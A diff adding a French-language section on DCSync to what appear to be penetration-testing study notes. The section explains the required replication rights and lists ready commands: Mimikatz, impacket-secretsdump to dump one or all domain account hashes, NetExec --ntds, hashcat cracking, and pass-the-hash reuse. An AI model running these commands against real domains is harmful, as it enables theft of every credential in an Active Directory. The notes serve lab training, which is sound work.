@@ -350,3 +350,39 @@ iwr -UseDefaultCredentials http://web04
 
 > Patch Microsoft (octobre 2022) : le champ `PAC_REQUESTOR` doit être validé par le DC si client et KDC sont dans le même domaine — empêche de forger des tickets pour des users inexistants, mais pas pour des users valides.
 
+### DCSync
+
+Imite un DC pour demander la réplication des credentials d'un utilisateur via l'API `IDL_DRSGetNCChanges` (protocole DRS). Le DC cible ne vérifie pas si la demande vient d'un vrai DC — seulement que le SID a les droits requis.
+
+**Droits requis** : `Replicating Directory Changes` + `Replicating Directory Changes All`. Par défaut : membres de **Domain Admins**, **Enterprise Admins**, **Administrators**.
+
+**Depuis Windows (Mimikatz)**
+
+```
+lsadump::dcsync /user:corp\dave
+lsadump::dcsync /user:corp\Administrator
+```
+
+**Depuis Kali (impacket-secretsdump)**
+
+```bash
+impacket-secretsdump -just-dc-user dave corp.com/jeffadmin:'<password>'@<IP_DC>
+
+# Dump tous les comptes
+impacket-secretsdump corp.com/jeffadmin:'<password>'@<IP_DC>
+```
+
+**Depuis Kali (NetExec)**
+
+```bash
+nxc smb <IP_DC> -u '<user>' -p '<password>' --ntds
+```
+
+**Cracker le hash NTLM obtenu (mode 1000)**
+
+```bash
+hashcat -m 1000 hashes.dcsync /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
+```
+
+> Les hashes NTLM obtenus par DCSync peuvent aussi être utilisés directement en **Pass-the-Hash** sans avoir à les craquer (voir Lateral Movement).
+
